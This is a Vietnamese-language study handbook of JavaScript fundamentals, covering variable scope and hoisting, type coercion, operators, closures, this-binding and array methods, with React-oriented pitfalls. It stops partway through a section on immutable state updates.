# 📖 SỔ TAY ĐÚC KẾT BẢN CHẤT JAVASCRIPT (JS STUDY NOTES)

> Cuốn sổ tay diễn giải bản chất theo cách dễ hiểu nhất, đào sâu cơ chế ngầm V8, bẫy phỏng vấn và các case thảm họa thực tế. Đọc lại sau 6 tháng vẫn hiểu ngay tức thì mà không cần tra cứu thêm.

---

## 📌 MỤC 1: BIẾN, KIỂU DỮ LIỆU VÀ TOÁN TỬ

### 1. `let`, `const` và lý do vì sao cấm dùng `var`:
- **`var` (Từ 1995):** 
  - *Định nghĩa:* Cách khai báo biến cổ xưa nhất của JavaScript.
  - *Phạm vi hoạt động (Scope):* Chỉ có **Function Scope**. Nghĩa là nó chỉ bị nhốt bên trong một hàm `function`. Nếu bạn khai báo `var` bên trong cặp ngoặc nhọn `{}` của `if`, `for`, `while` thì nó **xuyên thủng ngoặc nhọn chui ra ngoài**, làm ô nhiễm biến toàn cục.
  - *Cho phép khai báo trùng:* Viết `var a = 1;` rồi bên dưới lại viết `var a = 2;` trình duyệt vẫn im lặng chấp nhận, dễ làm vô tình ghi đè mất dữ liệu cũ.
  - *Cơ chế Hoisting:* Trong giai đoạn quét code ban đầu (Creation Phase), V8 Engine kéo biến `var` lên đầu và **tự ý gán sẵn giá trị `undefined`**.
- **Ba thảm họa thực tế khiến đi làm cấm tiệt dùng `var`:**
  1. *Làm lộ biến ra ngoài:* Biến tạm trong vòng `for` nhảy ra ngoài biến thành biến toàn cục, đè bẹp các biến khác cùng tên trong dự án.
  2. *Thảm họa vòng lặp bất đồng bộ (`for (var i = 0; i < 3; i++) setTimeout`):* Sau 1 giây màn hình in ra toàn số `3` thay vì `0, 1, 2`. Lý do: Cả 3 hàm `setTimeout` đều dùng chung **đúng 1 ô nhớ** của biến `i` trên phạm vi toàn cục. Vòng lặp chạy xong thì `i = 3`, 1 giây sau các hàm mới mở ô nhớ đó ra xem thì chỉ thấy số 3!
  3. *Lỗi ngầm làm sập ứng dụng (Silent Bug):* Vì `var` được gán ngầm `undefined`, bạn dùng biến trước khi khai báo không bị báo lỗi đỏ ngay. Đến dòng sau bạn chọc vào `isAdmin.role` thì trình duyệt mới ngã ngửa ném lỗi sập trắng app: `TypeError: Cannot read properties of undefined`.
- **`let` (ES6 - 2015):** 
  - *Định nghĩa:* Khai báo một biến có thể thay đổi (gán lại) giá trị trong tương lai.
  - *Phạm vi (Scope):* Có **Block Scope** -> Bị nhốt chặt trong **bất kỳ cặp ngoặc nhọn `{}` nào** (`if`, `for`, hàm). Ra ngoài ngoặc nhọn là biến biến mất.
  - *Hoisting & Vùng chết TDZ:* `let` vẫn bị Hoisting, nhưng V8 **không gán giá trị gì cả** mà nhốt nó vào **Vùng chết tạm thời (Temporal Dead Zone - TDZ)**. Nếu bạn cố tình dùng biến trước dòng khai báo, trình duyệt sẽ ném lỗi đỏ ngay lập tức: `ReferenceError: Cannot access before initialization` để cảnh báo bạn sửa ngay.
  - *Trong vòng lặp `for (let i = 0; i < 3; i++)`:* Mỗi vòng lặp V8 tạo ra một ô nhớ độc lập riêng biệt cho `i` -> Các hàm callback giữ đúng các giá trị `0, 1, 2`.
- **`const` (ES6 - 2015):** 
  - Giống hệt `let` về Scope và TDZ, nhưng mang tính chất là **Hằng số**: Bắt buộc phải gán giá trị ngay lúc khai báo.
  - **Không cho phép gán lại con trỏ ô nhớ:** Gõ `const a = 1; a = 2;` sẽ báo lỗi `TypeError: Assignment to constant variable`.
  - *Lưu ý quan trọng:* Với Object và Mảng, `const` chỉ khóa không cho bạn trỏ sang mảng/object khác (`a = []`), chứ bạn **vẫn có thể thêm, sửa, xóa các thuộc tính bên trong mảng/object đó** bình thường (`arr.push()`, `obj.name = "mới"`).

---

### 2. Kiểu nguyên thủy (Primitive):
- Gồm 7 kiểu: `string`, `number`, `boolean`, `null`, `undefined`, `symbol`, `bigint`.
- *Cơ chế lưu trữ ngầm:* Có kích thước cố định, được lưu trực tiếp giá trị vào vùng nhớ **Call Stack** (truy xuất cực kỳ nhanh).
- *Cách sao chép (Pass-by-value):* Khi bạn viết `let b = a;`, V8 tạo ra một ô nhớ mới hoàn toàn độc lập và copy nguyên vẹn giá trị của `a` bỏ sang `b`. Sau đó bạn sửa `b` thì `a` vẫn đứng nguyên, không suy suyển.

---

### 3. Object và Array (Kiểu tham chiếu - Reference type):
- Gồm: Object `{}` và Mảng `[]`.
- *Cơ chế lưu trữ ngầm:* Kích thước động co giãn liên tục, dữ liệu thực sự nằm tại vùng nhớ rộng lớn **Heap**. Biến khai báo trên Stack **chỉ lưu Địa chỉ con trỏ (Memory Address)** trỏ sang ngôi nhà trên Heap.
- *Bản chất của phép gán `b = a`:* Phép gán này **KHÔNG HỀ NHÂN BẢN** dữ liệu! Nó chỉ sao chép địa chỉ con trỏ. Cả `a` và `b` cùng cầm chìa khóa trỏ vào đúng 1 ngôi nhà trên Heap -> Khi bạn gọi `b.push(3)`, nghĩa là bạn dẫn thêm người vào nhà, thì `a` mở cửa ra đương nhiên cũng thấy mảng của mình bị biến thành `[1, 2, 3]`.
- *Bản chất của phép so sánh `===`:* Với Object và Mảng, JS **so sánh Địa chỉ ô nhớ chứ không thèm nhìn ruột bên trong**:
  - `[] === []` trả về **`false`**! Lý do: Mỗi lần bạn mở ngoặc vuông `[]`, V8 lại đi xây một ngôi nhà mới toanh trên Heap (`0x001` và `0x002`). Hai địa chỉ khác nhau nên so sánh ra `false`.
  - `{} === {}` cũng trả về **`false`**.
- *Ý nghĩa sống còn trong React State:* React dùng phép so sánh địa chỉ (`oldState === newState`) để quyết định xem có cần vẽ lại giao diện không. Nếu bạn mutate trực tiếp `cart.push(item)` rồi gọi `setCart(cart)`, React thấy địa chỉ cũ và mới vẫn là `0x001`, nó tưởng bạn chưa đổi gì nên nó **đứng im không thèm render lại**! Đó là lý do bắt buộc phải dùng toán tử Spread: `setCart([...cart, item])` để ép V8 tạo ra địa chỉ mới (`0x002`), lúc này React mới chịu cập nhật giao diện.

---

### 4. 8 giá trị Falsy trong JavaScript:
Trong JavaScript, khi chuyển đổi sang kiểu Đúng/Sai (Boolean), **MỌI THỨ ĐỀU LÀ TRUTHY**, NGOẠI TRỪ đúng **8 giá trị Falsy** sau:
1. `false`
2. `0`
3. `-0`
4. `0n` (BigInt không)
5. `""` (chuỗi rỗng không có ký tự nào)
6. `null`
7. `undefined`
8. `NaN` (phép tính số học lỗi)

👉 *Bẫy phỏng vấn Senior:* Mảng rỗng `[]` và Object rỗng `{}` khi nhét vào câu lệnh `if` là Đúng hay Sai? 
Đáp án: Là **`true` (Truthy)**! Vì chúng là Object, mà mọi Object trong JS dù rỗng hay đặc đều là Truthy.

---

### 5. So sánh `===`, `!==` (Chặt chẽ) vs `==`, `!=` (Lỏng lẻo):
- **`===` / `!==` (Strict):** So sánh cả **Giá trị** lẫn **Kiểu dữ liệu**, không bao giờ ép kiểu ngầm. Đây là tiêu chuẩn bắt buộc dùng khi đi làm thực tế.
- **`==` / `!=` (Loose):** Tự ý ép kiểu ngầm (Type Coercion) trước khi so sánh, sinh ra các kết quả kỳ dị (`0 == ""` là `true`, `false == "0"` là `true`).
- **Nghịch lý `null` và `undefined`:**
  - `null == undefined` là **`true`**: Đây là điều luật riêng của ECMAScript, coi 2 thằng này tương đương nhau và chỉ bằng chính chúng, không ép kiểu sang số hay boolean (ví dụ: `null == 0` là `false`, `null == false` là `false`).
  - `null === undefined` là **`false`**: Vì khác kiểu dữ liệu (`Null` vs `Undefined`).

---

### 6. Bản chất các toán tử logic (`&&`, `||`, `??`):
- **`||` (Đi tìm giá trị Truthy đầu tiên):** 
  - Nó duyệt từ trái sang phải, hễ gặp giá trị Truthy đầu tiên là nó chụp lấy giá trị đó ngay và dừng lại. Nếu tất cả đều là Falsy thì nó đành ngậm ngùi lấy giá trị cuối cùng.
  - *Thảm họa thực tế:* Vì nó coi số `0` và chuỗi rỗng `""` là rác (Falsy), nên món hàng miễn phí ship `0đ` khi viết `shippingFee || 30000` sẽ bị nó bỏ qua số 0 và ép khách phải trả `30000đ`!
- **`??` (Nullish Coalescing - Sinh ra trong ES2020 để sửa sai cho `||`):**
  - **CHỈ xem `null` và `undefined` là thiếu giá trị**.
  - Nó bảo vệ số `0`, `false`, chuỗi rỗng `""` là dữ liệu hợp lệ. Viết `0 ?? 30000` nó sẽ giữ lại đúng số `0`.
- **`&&` (Đi tìm giá trị Falsy đầu tiên - Kẻ ngáng đường):**
  - Duyệt từ trái sang phải, hễ gặp Falsy đầu tiên là dừng lại lấy ngay giá trị đó. Nếu tất cả đều là Truthy thì nó trả về giá trị cuối cùng.
  - *Ứng dụng trong React JSX:* `isLoggedIn && <UserProfile />` -> Nếu chưa đăng nhập (`false`) thì dừng ngay không vẽ gì cả, nếu đã đăng nhập (`true`) thì lấy vế sau để vẽ giao diện.

---

### 7. Optional Chaining (`?.`):
- *Định nghĩa:* Chiếc "khiên an toàn" khi muốn chọc sâu vào các thuộc tính con lồng nhau (`user?.profile?.name`).
- *Cơ chế hoạt động:* Nếu đối tượng phía trước dấu `?.` là `null` hoặc `undefined`, nó lập tức **dừng cuộc chơi và trả về `undefined`**, không thèm chọc tiếp vào trong.
- *Tác dụng:* Cứu sống ứng dụng không bị sập trắng màn hình bởi lỗi kinh điển: `TypeError: Cannot read properties of undefined`.

---

### 8. Phân biệt rạch ròi giữa `null` và `undefined`:
- **`undefined` (Chưa được định nghĩa):** Do trình duyệt tự động gán. Biểu thị một biến đã được cấp ô nhớ nhưng chưa được nhét giá trị vào, hoặc một hàm không có lệnh `return`, hoặc bạn cố tình truy cập một thuộc tính không hề tồn tại trong object.
- **`null` (Rỗng / Không có gì):** Do chính Lập trình viên chủ động gán bằng tay. Biểu thị rằng: *"Tại thời điểm này, biến này cố tình để rỗng, sau này sẽ gán dữ liệu sau"* (ví dụ: giỏ hàng rỗng `currentUser = null`).
- **Nghịch lý `typeof null === "object"` (Bug lịch sử từ 1995):** 
  - Tác giả Brendan Eich thiết kế JS trong 10 ngày. Trong bộ mã nhị phân C++ của ông, nhãn kiểu `000` đại diện cho Object, và con trỏ rỗng `null` cũng có địa chỉ toàn số 0. Thế nên hàm `typeof` nhìn thấy toàn số 0 liền phán bừa là `"object"`.
  - Lỗi này vĩnh viễn không được sửa vì nếu sửa sẽ làm tê liệt hàng triệu trang web cũ trên toàn cầu. Bản chất `null` là Primitive, không phải Object.

---

### 9. Ép kiểu số / chuỗi (Type Coercion) và cạm bẫy tính toán:
- **Phép cộng `+` (Ưu tiên nối chuỗi):** Có tính kết hợp từ Trái sang Phải. Hễ gặp bất kỳ vế nào là String, nó lập tức biến thành **phép dán chuỗi**:
  - `1 + 2 + 3 + "4"` -> Tính `1 + 2 = 3`, `3 + 3 = 6`, gặp `"4"` thì dán số 6 với chữ 4 thành chuỗi **`"64"`**.
  - `"4" + 3 + 2 + 1` -> Gặp `"4"` đầu tiên nên dán liên tục thành **`"4321"`**.
- **Các phép toán khác (`-`, `*`, `/`):** Luôn luôn cố gắng ép các vế về kiểu **Number** để tính toán (`"50" - 20 = 30`).
- **`NaN` (Not-a-Number - Không phải một con số):**
  - Sinh ra khi thực hiện một phép tính toán vô lý (ví dụ: lấy chữ trừ số `"50k" - 10`).
  - *Nghịch lý 1:* `typeof NaN` lại in ra là **`"number"`** (nghĩa là: Nó là một giá trị số biểu thị cho phép tính không hợp lệ).
  - *Nghịch lý 2:* `NaN === NaN` trả về **`false`**! (NaN là giá trị duy nhất trong JavaScript không bằng chính nó). Muốn kiểm tra một biến có bị NaN không, bắt buộc phải dùng hàm `Number.isNaN(val)`.
- **LocalStorage:** Chỉ lưu chuỗi String. Nếu bạn nhét thẳng Object vào, LocalStorage sẽ âm thầm gọi `.toString()` biến object của bạn thành chuỗi vô nghĩa **`"[object Object]"`**, toàn bộ dữ liệu ruột bên trong bị bốc hơi vĩnh viễn không cứu lại được! Bắt buộc phải dùng `JSON.stringify(obj)` khi lưu và `JSON.parse(raw)` khi đọc ra.

---

## 📌 MỤC 2: ĐIỀU KIỆN VÀ VÒNG LẶP

### 1. `if/else`, `switch/case`, toán tử ba ngôi (Ternary):
- **`if/else` & `switch/case` là Câu lệnh (Statement):** Nó chỉ làm nhiệm vụ điều hướng luồng chạy, bản thân nó không tự trả về một giá trị -> Không thể nhét trực tiếp vào giữa các thẻ HTML trong JSX của React.
- **Ternary (`điều_kiện ? giá_trị_đúng : giá_trị_sai`) là Biểu thức (Expression):** Nó luôn tính toán và trả về một giá trị cụ thể -> Nhúng trực tiếp vào giữa thẻ giao diện React được ngay (`{isLoggedIn ? <User /> : <Login />}`).
- **Clean Code thực chiến:** Cấm tiệt viết Ternary lồng 3-4 tầng vì cực kỳ hại não khi debug. Khi có từ 3 điều kiện trở lên, hãy dùng `switch/case` hoặc kỹ thuật tra cứu qua Object (Object Lookup):
  ```javascript
  const roleMap = { admin: "Toàn quyền", editor: "Sửa bài", user: "Xem" };
  const access = roleMap[role] || "Khóa"; // Ngắn gọn, sạch sẽ, tốc độ O(1)
  ```

---

### 2. Vòng lặp `for`, `for...of`, `for...in`:
- **`for` (Truyền thống `let i = 0`):** Kiểm soát chỉ số index, cho phép bước nhảy linh hoạt (`i += 2`), chạy nhanh nhất về mặt hiệu năng.
- **`for...of` (Dành riêng cho Mảng / Iterable):** Duyệt trực tiếp qua từng **Giá trị phần tử (Value)**: `"Táo"`, `"Cam"`, `"Xoài"`.
- **`for...in` (Dành riêng cho Object):** 
  - Duyệt qua các **Tên thuộc tính (Key)** của một Object.
  - *Tại sao CẤM dùng `for...in` cho Mảng?* Vì bản chất Mảng trong JS là một Object có các key là chuỗi `"0"`, `"1"`, `"2"`. Khi duyệt bằng `for...in`, biến lặp nhận giá trị là String `"0"`. Phép tính `i + 1` sẽ bị biến thành nối chuỗi `"0" + 1 = "01"`, làm sai lệch toàn bộ chỉ số index!

---

### 3. Điều khiển luồng: `break` và `continue`:
- **`break`:** Lập tức bẻ gãy và thoát ra khỏi vòng lặp ngay tại thời điểm đó.
- **`continue`:** Bỏ qua các dòng code phía dưới của lần lặp này và nhảy cóc sang lần lặp kế tiếp.
- *Lưu ý sống còn:* `break` và `continue` chỉ hợp lệ bên trong các vòng lặp nguyên bản (`for`, `while`, `switch`). **Cấm tiệt dùng trong `forEach()` hay `map()`** vì sẽ bị lỗi cú pháp `SyntaxError: Illegal break statement`.

---

### 4. Khi nào dùng Vòng lặp vs Khi nào dùng Hàm mảng:
- Dùng **Vòng lặp (`for...of`, `for` i):** Khi bạn cần duyệt mảng mà có điều kiện **DỪNG SỚM (`break`)** ngay khi tìm thấy mục tiêu (tiết kiệm CPU, không bắt máy chạy hết 10.000 phần tử thừa).
- Dùng **Hàm mảng (`.map()`, `.filter()`, `.reduce()`):** Khi cần xử lý toàn bộ danh sách để biến đổi dữ liệu phục vụ render trong React (ngắn gọn, viết code theo phong cách khai báo hiện đại).

---

## 📌 MỤC 3: FUNCTION — TRÁI TIM CỦA JS & REACT

### 1. Function Declaration vs Function Expression (Sự khác biệt về Hoisting):
- **Function Declaration (`function sayHi() {}`):** 
  - *Định nghĩa:* Cách khai báo hàm truyền thống với từ khóa `function` đứng đầu dòng.
  - *Cơ chế Hoisting:* Trong lượt quét Creation Phase ban đầu, V8 Engine bê **nguyên vẹn cả tên lẫn thân ruột của hàm** lên đầu phạm vi và cấp phát bộ nhớ sẵn sàng. Do đó, bạn gọi hàm ở dòng trước hay dòng sau thì hàm đều đã có sẵn trong RAM -> Chạy mượt mà.
- **Function Expression (`const sayHi = function() {}` hoặc Arrow Function):** 
  - *Định nghĩa:* Khai báo một biến rồi gán định nghĩa hàm vào biến đó.
  - *Cơ chế Hoisting:* Nó bị chi phối bởi quy luật của biến `const`/`let` -> Tên biến vẫn được hoisted nhưng bị nhốt vào **Vùng chết tạm thời (TDZ)** và chưa được gán bất kỳ hàm nào. Nếu bạn gọi hàm trước dòng khai báo, máy sẽ quăng lỗi đỏ: `ReferenceError: Cannot access before initialization`. *(Nếu dùng `var sayHi = ...` thì bị gán `undefined`, gọi `sayHi()` sẽ ném lỗi `TypeError: sayHi is not a function`)*.

---

### 2. Arrow Function và từ khóa `this`:
- *Định nghĩa:* Cú pháp hàm mũi tên ngắn gọn ra đời trong ES6 (`() => {}`).
- *Bản chất của `this` trong Hàm thường (`function`):* Hàm thường có ô nhớ `this` riêng. Giá trị của `this` được quyết định tại **Thời điểm ĐƯỢC GỌI** (Nhìn xem lúc gọi ai đứng trước dấu chấm `.`: `user.say()` thì `this` là `user`, còn nếu gán ra ngoài rồi gọi trọc lốc `fn()` thì không có ai đứng trước dấu chấm -> `this` bị trôi về `window`).
- *Bản chất của `this` trong Arrow Function:* **NÓ THỰC SỰ KHÔNG CÓ `this` CỦA RIÊNG NÓ! (No this binding)**.
  - V8 Engine hoàn toàn không tạo ô nhớ `this` cho Arrow Function.
  - Khi bạn gọi `user.sayArrow()`, nó **hoàn toàn bơ dấu chấm và người gọi nó**!
  - Nó đối xử với chữ `this` như một biến thông thường. Theo cơ chế tìm kiếm phạm vi (Scope Chain), nó **mượn `this` của phạm vi cha bao bọc nó ngay tại Thời điểm KHAI BÁO (Lexical this)**. Vì Object literal `{}` không tạo ra Scope, nên cha của nó là Global Window -> `this` bị đóng băng là `window`.
- *Đặc điểm khác của Arrow Function:* Không có đối tượng `arguments`, không dùng làm hàm khởi tạo Constructor (`new`) được, hỗ trợ viết ngắn gọn trả về kết quả không cần ngoặc `{}` (Implicit return: `const add = (a, b) => a + b`).
- *Ứng dụng vàng:* Dùng Arrow Function làm Callback trong `setTimeout`, `setInterval`, sự kiện React để **không bao giờ bị mất con trỏ `this` của đối tượng cha bên ngoài**.

---

### 3. Tham số (Parameters) và Giá trị mặc định (Default Parameters):
- *Khái niệm:* 
  - **Tham số (Parameter):** Là các biến đại diện được đặt tên ở đầu hàm (`function fn(page, limit)`).
  - **Đối số (Argument):** Là dữ liệu thực tế bạn truyền vào khi gọi hàm (`fn(1, 10)`).
- *Giá trị mặc định (`function fn(page = 1, limit = 6)`):* 
  - Được dùng làm "phao cứu sinh" dự phòng khi người gọi hàm quên truyền hoặc truyền thiếu đối số.
  - **Cơ chế kích hoạt:** Nếu truyền đối số vào, tham số sẽ nhận giá trị mới đó. Nhưng nếu người gọi **hoàn toàn không truyền gì** (`fn()`) HOẶC **cố tình truyền giá trị `undefined`** (`fn(undefined, 10)`), thì V8 Engine mới kích hoạt giá trị mặc định dự phòng (`page = 1`).
  - *Cạm bẫy phỏng vấn:* Nếu bạn truyền `null` (`fn(null, 10)`), JS xem `null` là một giá trị có chủ ý của người lập trình, nên nó **KHÔNG THÈM kích hoạt giá trị mặc định**, biến `page` sẽ nhận giá trị là `null`!

---

### 4. Lệnh `return` và cơ chế Early Return:
- `return` ngắt hàm ngay lập tức và đẩy giá trị ra ngoài. Nếu một hàm chạy hết code mà không có chữ `return`, nó mặc định trả về `undefined`.
- *Kỹ thuật Early Return (Guard Clauses - Thoát sớm):* 
  - Thay vì bọc toàn bộ code trong các khối `if...else` lồng nhau tầng tầng lớp lớp (Pyramid of Doom), ta kiểm tra các điều kiện lỗi trước và dùng `return` để kết thúc hàm ngay lập tức ở các dòng đầu tiên.
  - Giúp code thẳng hàng, phẳng phiu, giảm độ phức tạp và cực kỳ dễ đọc khi bảo trì dự án.

---

### 5. Callback Function (Hàm là First-Class Citizen):
- Trong JS, Hàm được xem như một biến bình thường: bạn có thể gán hàm vào biến, truyền hàm vào tham số của một hàm khác (gọi là Callback), và một hàm có thể đẻ ra một hàm khác.
- **Bẫy kinh điển: Phân biệt `fn` vs `fn()`:**
  - **`fn` (Viết tên hàm KHÔNG CÓ ngoặc đơn):** Giống như việc bạn **đưa danh thiếp / số điện thoại của bạn cho người khác**. Bạn bảo nút bấm: *"Khi nào có người click chuột thì hãy gọi hàm này giúp tôi"*. Lúc này hàm CHƯA CHẠY, chỉ đứng đợi khi nào có sự kiện xảy ra mới được gọi.
  - **`fn()` (Viết tên hàm CÓ ngoặc đơn):** Cặp ngoặc tròn `()` là mệnh lệnh: **"Hãy bấm máy gọi ngay tại chỗ!"**. Dù người dùng chưa click chuột, ngay lúc trình duyệt đọc lướt qua dòng code đó là hàm đã bị kích hoạt chạy ngay lập tức, rồi nó ném giá trị trả về (thường là `undefined`) vào sự kiện!
  - *Hậu quả chết người trong React:* Viết `<button onClick={setCount(1)}>` có dấu `()` sẽ khiến hàm chạy ngay lúc component vừa mở ra -> đổi state -> React bắt render lại -> lại gặp `setCount(1)` -> lại chạy... tạo thành **Infinite Loop (Vòng lặp vô tận làm treo đứng trang web)**. Bắt buộc phải viết `<button onClick={() => setCount(1)}>`.

---

### 6. Higher-Order Function (HOF) ở mức cơ bản:
- *Định nghĩa:* Là một hàm thỏa mãn 1 trong 2 điều kiện:
  1. Nhận một hàm khác làm tham số (ví dụ: `.map()`, `.filter()`, `.forEach()`).
  2. Hoặc trả về một hàm mới (ví dụ: các hàm sinh bộ đếm Closure).

---

### 7. Scope và Closure (Bao đóng):
- **Scope (Phạm vi truy cập biến):** Gồm Global Scope (toàn cục), Function Scope (trong hàm), Block Scope (trong cặp ngoặc nhọn `{}` của let/const).
- **Closure:** Là sự kết hợp giữa một hàm con và môi trường bao quanh (Lexical Scope) nơi mà nó được sinh ra.
- **Ba điều kiện nhận biết một Closure bằng mắt thường trên code:**
  1. *Điều kiện 1:* Có một hàm con nằm lọt thỏm bên trong một hàm cha.
  2. *Điều kiện 2 (Cốt lõi):* Hàm con **có xài ké ít nhất một biến** của hàm cha. *(Nếu hàm con không dùng biến nào của cha, V8 sẽ không tạo Closure để đỡ tốn RAM).*
  3. *Điều kiện 3:* Hàm con được mang ra ngoài phạm vi hàm cha để sống tiếp (thường là bằng cách `return` hàm con đó ra ngoài, hoặc truyền hàm con vào `addEventListener`, `setTimeout`).
- **Cơ chế ngầm của V8:** Khi hàm cha chạy xong và chết đi, V8 phát hiện hàm con bên ngoài vẫn cần dùng biến của cha, nên V8 **không thu gom rác biến đó** mà nhét vào một "chiếc ba lô" Closure gắn chặt vào hàm con (kiểm chứng tận mắt bằng Chrome DevTools -> tab Sources -> cột Scope -> `Closure`).
- *Ứng dụng:* Dùng để đóng gói biến riêng tư (Private Variable) không cho bên ngoài can thiệp bậy, và là **nền tảng cốt lõi của React Hook `useState`** (giúp biến state không bị mất đi mỗi khi component re-render).

---

### 8. Pure Function (Hàm thuần khiết):
- *Định nghĩa:* Một hàm được gọi là Pure Function khi thỏa mãn đủ **2 điều kiện khắt khe**:
  1. **Cùng Input -> Luôn luôn cho ra Cùng Output:** Hàm không được phụ thuộc vào biến bên ngoài, không dùng `Math.random()`, không dùng `Date.now()`. Đưa vào `add(2, 3)` thì 10 năm sau chạy lại nó vẫn phải ra `5`.
  2. **Không gây tác dụng phụ (No Side-effects):** Hàm không được thò tay ra ngoài để sửa biến toàn cục, không làm biến đổi mảng/object truyền vào (không mutate), không tự ý gọi API hay ghi đè vào cây DOM bên ngoài.
- *Tầm quan trọng sống còn trong React:* Mọi **React Component và Redux Reducer bắt buộc phải là Pure Function** để đảm bảo giao diện luôn luôn dự đoán được, không sinh ra lỗi giao diện giật lag lung tung và giúp React tối ưu hóa việc vẽ lại màn hình.

---

## 📌 MỤC 4: ARRAY — BẮT BUỘC PHẢI CHẮC (CỐT LÕI CỦA REACT)

### 1. Hàm `.map()` (Biến đổi danh sách):
- *Định nghĩa:* Lặp qua từng phần tử của mảng, chạy hàm callback và gom kết quả trả về thành một **Mảng MỚI toanh có cùng độ dài**.
- *Không làm thay đổi mảng gốc (Immutable):* Mảng ban đầu vẫn giữ nguyên vẹn 100%.
- *Ứng dụng cốt lõi trong React:* Dùng liên tục để biến mảng dữ liệu thành danh sách các thẻ giao diện JSX (`products.map(p => <ProductCard key={p.id} data={p} />)`).

---

### 2. Hàm `.filter()` (Lọc danh sách):
- *Định nghĩa:* Lặp qua từng phần tử, chỉ giữ lại những phần tử nào mà hàm callback trả về `true`.
- *Kết quả:* Trả về một **Mảng MỚI** chứa các phần tử thỏa mãn điều kiện. Không làm thay đổi mảng gốc.
- *Ứng dụng:* Dùng để tìm kiếm sản phẩm theo từ khóa, lọc theo danh mục, hoặc làm chức năng **XÓA phần tử** khỏi State trong React (`cart.filter(item => item.id !== removeId)`).

---

### 3. Hàm `.find()` và `.findIndex()` (Tìm kiếm dừng sớm):
- **`.find()`:** 
  - Quét mảng từ đầu đến cuối, trả về **chính phần tử đầu tiên** thỏa mãn điều kiện. Nếu không tìm thấy ai, trả về **`undefined`**.
  - *Cơ chế ngầm:* Dừng vòng lặp ngay lập tức khi tìm thấy (Early Exit), không duyệt các phần tử phía sau.
- **`.findIndex()`:** 
  - Giống `find`, nhưng trả về **Chỉ số index (vị trí)** của phần tử trong mảng. Nếu không tìm thấy, trả về **`-1`**.
  - *Ứng dụng:* Dùng khi cần cập nhật dữ liệu tại chỗ với hiệu năng cao nhất $O(N/2)$ trong JS thuần.

---

### 4. Hàm `.some()` và `.every()` (Kiểm tra điều kiện logic):
- **`.some()` (Có ít nhất một):** 
  - Kiểm tra xem trong mảng có **ít nhất 1 phần tử** thỏa mãn điều kiện hay không.
  - *Cơ chế:* Quét từ trái sang phải, hễ gặp phần tử đầu tiên trả về `true` là nó lập tức dừng vòng lặp và nhả ra **`true`**. Nếu duyệt hết mà không ai thỏa mãn thì trả về `false`.
  - *Ứng dụng:* Kiểm tra giỏ hàng xem có sản phẩm nào hết hàng không (`cart.some(p => p.stock === 0)`).
- **`.every()` (Tất cả đều phải đúng):** 
  - Kiểm tra xem có phải **100% phần tử** trong mảng đều thỏa mãn điều kiện không.
  - *Cơ chế:* Hễ gặp đúng 1 phần tử bị `false` là nó dừng ngay lập tức và trả về **`false`**.
  - *Ứng dụng:* Kiểm tra xem khách đã tích chọn đồng ý hết các điều khoản chưa, hoặc tất cả sản phẩm có đủ tồn kho không.

---

### 5. Cỗ máy gom dữ liệu `.reduce()` và bẫy quên `initialValue`:
- *Định nghĩa:* Duyệt qua mảng và tích lũy các phần tử lại thành **ĐÚNG MỘT GIÁ TRỊ DUY NHẤT** (có thể là một con số tổng tiền, một chuỗi String, hoặc gom thành một Object/Mảng mới).
- *Cú pháp chuẩn:* `arr.reduce((accumulator, item) => accumulator + item.price, 0)`.
- **Cơ chế ngầm & Thảm họa khi quên `initialValue` (Số 0 ở cuối):**
  - *Khi CÓ `initialValue`:* Biến tích lũy nhận giá trị đó, vòng lặp chạy từ index 0. Nếu mảng rỗng `[]`, nó trả về ngay `initialValue` an toàn (tổng tiền = 0đ).
  - *Khi QUÊN `initialValue`:* V8 Engine lấy phần tử index 0 làm giá trị khởi tạo và bắt đầu lặp từ index 1.
  - *Hậu quả 1:* Nếu mảng bị rỗng (`[]`), V8 không tìm thấy index 0 -> Ném lỗi đỏ lòm làm sập trắng app: `TypeError: Reduce of empty array with no initial value`.
  - *Hậu quả 2:* Nếu mảng chứa các Object, nó lấy nguyên Object đầu tiên cộng với số -> Ép kiểu sinh ra chuỗi kỳ dị `"[object Object]200"`.
  - 👉 **Quy tắc:** LUÔN LUÔN truyền giá trị khởi tạo `0`, `[]`, hoặc `{}` ở cuối hàm `reduce`.

---

### 6. Hàm `.sort()` và bẫy phá hủy mảng gốc (Mutate):
- *Bẫy thứ tự Alphabet:* Mặc định nếu gọi `scores.sort()` không truyền tham số, JS Engine sẽ **âm thầm ép mọi số thành chuỗi String** rồi so sánh theo bảng chữ cái UTF-16 từ trái sang phải. Chữ `"1"` trong `"100"` đứng trước chữ `"2"` trong `"25"`, dẫn đến việc số `100` bị xếp đứng trước số `25` (`[1, 10, 100, 25, 40, 5]`)!
- *Cách khắc phục:* Phải truyền hàm so sánh (Comparator):
  - Tăng dần: `scores.sort((a, b) => a - b)`
  - Giảm dần: `scores.sort((a, b) => b - a)`
- *Bẫy Mutate mảng gốc & Thảm họa React:* `.sort()` sắp xếp **trực tiếp tại chỗ trên mảng ban đầu**, không tạo mảng mới. 
  - Trong React, nếu bạn gọi `products.sort()`, địa chỉ ô nhớ không hề đổi (`0x001`). React thấy địa chỉ cũ liền **từ chối re-render**, giao diện đứng im không chịu sắp xếp!
  - 👉 **Cách viết chuẩn Senior:** Luôn clone ra mảng mới trước khi sort: `const sorted = [...products].sort((a, b) => a - b);`.

---

### 7. Phân biệt `slice` vs `splice` và `includes`:
- **`slice(startIndex, endIndex)` (Cắt lát - Bất biến / Immutable):** 
  - Cắt ra một phần của mảng đem sang đĩa mới, **mảng gốc giữ nguyên 100%** (chính là hàm dùng làm thuật toán phân trang). Cực kỳ an toàn.
- **`splice(startIndex, deleteCount, ...insertItems)` (Xẻo thịt - Mutate mảng gốc):** 
  - Can thiệp phẫu thuật trực tiếp vào mảng ban đầu: vừa xóa các phần tử cũ, vừa chèn được các phần tử mới vào vị trí đó. Làm mất dữ liệu gốc, cấm dùng trực tiếp trên React State.
- **`includes(value)`:** 
  - Kiểm tra xem mảng có chứa giá trị đó hay không, trả về `true` hoặc `false` (nhanh gọn hơn `indexOf(val) !== -1`).

---

### 8. Bộ ba quyền lực Thêm - Sửa - Xóa Bất Biến (Immutable) trong React:
- **Cơ chế ngầm của React:**
  - React kiểm tra sự thay đổi của State bằng thuật toán so sánh nông (Shallow Comparison: `Object.is(oldState, newState)`). Nó chỉ kiểm tra xem **ĐỊA CHỈ Ô NHỚ (Reference)** có bị thay đổi hay không.
